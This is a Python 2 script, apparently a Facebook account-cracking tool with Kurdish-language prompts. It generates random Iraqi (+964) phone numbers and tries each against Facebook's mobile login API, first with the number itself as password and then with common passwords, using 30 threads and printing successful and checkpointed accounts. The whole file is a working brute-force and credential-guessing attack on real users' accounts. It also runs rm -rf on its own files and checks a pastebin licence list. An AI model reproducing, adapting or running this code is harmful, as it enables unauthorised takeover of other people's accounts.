
import os
import sys
import time
import datetime
import random
import hashlib
import re
import threading
import json
import urllib
import cookielib
import getpass
import time
os.system('rm -rf .sss.py')
os.system('rm -rf .sss(2).py')
os.system('rm -rf .sss(3).py')
os.system('rm -rf .sss(4).py')
os.system('rm -rf .sss(5).py')
os.system('rm -rf list(6).txt')
os.system('rm -rf .txt')
os.system('espeak -a 300 BROXOTIVANDAM')
for n in range(101010):
    nmbr = random.randint(1111111, 9999999)
    sys.stdout = open('.txt', 'a')
    print nmbr
    sys.stdout.flush()


try:
    import requests
except ImportError:
    os.system('pip2 install requests')
    os.system('python2 .hhh.py')


try:
    import mechanize
except ImportError:
    os.system('pip2 install mechanize')
    os.system('python2 .hhh.py')

from multiprocessing.pool import ThreadPool
from requests.exceptions import ConnectionError
from mechanize import Browser
X = 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]'
bd = random.randint(2e+07, 3e+07)
sim = random.randint(20000, 40000)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'user-agent': X,
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
header = {
    'x-fb-connection-bandwidth': repr(bd),
    'user-agent': X,
    'x-fb-sim-hni': repr(sim),
    'x-fb-net-hni': repr(sim),
    'x-fb-connection-quality': 'EXCELLENT',
    'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
    'user-agent': 'Mozilla/5.0 (Linux; Android 5.0; SM-G900P Build/LRX21T; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/43.0.2357.121 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/35.0.0.48.273;]',
    'content-type': 'application/x-www-form-urlencoded',
    'x-fb-http-engine': 'Liger' }
reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)

def exb():
    print '[!] Exit'
    os.sys.exit()


def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.01)
    


def t():
    os.system('clear')


def cb():
    os.system('clear')

back = 0
successful = []
cpb = []
oks = []
id = []
os.system('clear')

def chk():
    uuid = str(os.geteuid()) + str(os.getlogin())
    id = '-'.join(uuid)
    print '\x1b[37;1mYour ID : ' + id
    
    try:
        httpCaht = requests.get('https://pastebin.com/raw/ShPQBmdL').text
        if id in httpCaht:
            print '\x1b[92mYOUR ID IS ACTIVE.........'
            msg = str(os.geteuid())
            time.sleep(1)
        else:
            print '\x1b[91mBarezm Id kat active nya Tkaya bo Active krdn nama bnera bo telegram @ipythoni.......'
            time.sleep(1)
            sys.exit()
    except:
        sys.exit()
        if name == 'main':
            print logo
            chk()
        


chk()

def menu():
    os.system('rm -rf list.txt')
    os.system('clear')
    os.system('xdg-open https://t.me/ipythoni')
    time.sleep(2)
    print '\x1b[32m.'
    os.system('clear')
    os.system('figlet bnusa ;espeak -a 185 CODAKABNUSABANATGEM')
    print '\x1b[97;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[99;1m'
    print '   Auther: IPYTHONI\n   Chenall telegram: @IPYTHONI\n   bnwsa 123'
    print '\x1b[93;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[93;1m'
    action()


def action():
    bch = raw_input(' COD: ')
    if bch == '':
        print ' Cod akat halaya !'
        action()
    elif bch == '1999':
        os.system('python2 .1.py')
    elif bch == '123':
        os.system('clear')
        os.system('espeak -a 450 SayaKaremWelcome')
        os.system('clear')
        print '\x1b[32m.'
        os.system('clear')
        os.system('figlet GAYNFB')
        print '\x1b[91;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[93;1m'
        print '\x1b[33m 770 - 771 - 772 - 773 - 774\n  750 - 751 - 752 - 753 - 754\n   780 - 781 - 782 - 783 - 784\x1b[0;1m\n\x1b[93;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
        
        try:
            k = '+964'
            c = raw_input('\x1b[95;1m Saratakay chi bet : ')
            idlist = '.txt'
            for line in open(idlist, 'r').readlines():
                id.append(line.strip())
        except IOError:
            print '!'
            raw_input('\n[ Garanawa ]')
            menu()
        

    if bch == '13':
        login()
    elif bch == '0':
        exb()
    else:
        print '!'
        action()
    xxx = str(len(id))
    psb('\x1b[92;1m HamuZhmaraKan .txt ka: ' + xxx)
    print '\x1b[91;1m~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~\x1b[0;1m'
    
    def main(arg):
        user = arg
        
        try:
            time.sleep(0.1)
        except OSError:
            pass

        
        try:
            pass1 = user
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass1
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass1
            else:
                pass2 = '1122334455'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[X-OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass2
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mCP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass2
            else:
                pass3 = '1234554321'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[X-OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass3
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mX-CP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass3
            else:
                pass4 = '112233445566'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[X-OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass4
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mX-CP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass4
            else:
                pass5 = '20042004'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[X-OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass5
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mX-CP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass5
            else:
                pass6 = '20052005'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[X-OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass6
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mX-CP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass6
            else:
                pass7 = '20062006'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[X-OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass7
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mX-CP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass7
            else:
                pass8 = '20032003'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[X-OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass8
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mX-CP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass8
            else:
                pass9 = '20022002'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass9 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[X-OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass9
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mX-CP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass9
            else:
                pass10 = '20002000'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass10 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[X-OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass10
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mX-CP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass10
            else:
                pass11 = '19991999'
            data = br.open('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=1&email=' + k + c + user + '&locale=en_US&password=' + pass11 + '&sdk=ios&generate_session_cookies=1&sig=3f555f98fb61fcd7aa0c44f58f522efm')
            q = json.load(data)
            if 'access_token' in q and 'EAAA' in q or 'EAAAA' in q:
                print '\x1b[94;1m[X-OK]\x1b[92;1m Number: ' + k + c + user + ' PASS: ' + pass11
            elif 'www.facebook.com' in q['error_msg']:
                print '[\x1b[91;1mX-CP\x1b[93;1m] Number: ' + k + c + user + ' PASS: ' + pass11
        except:
            pass


    p = ThreadPool(30)
    p.map(main, id)
    print '         '
    print 'Tawaw Bw ....'
    raw_input('\n[Enter Bka Bo Darchwn]')
    os.sys.exit()

if __name__ == '__main__':
    menu()
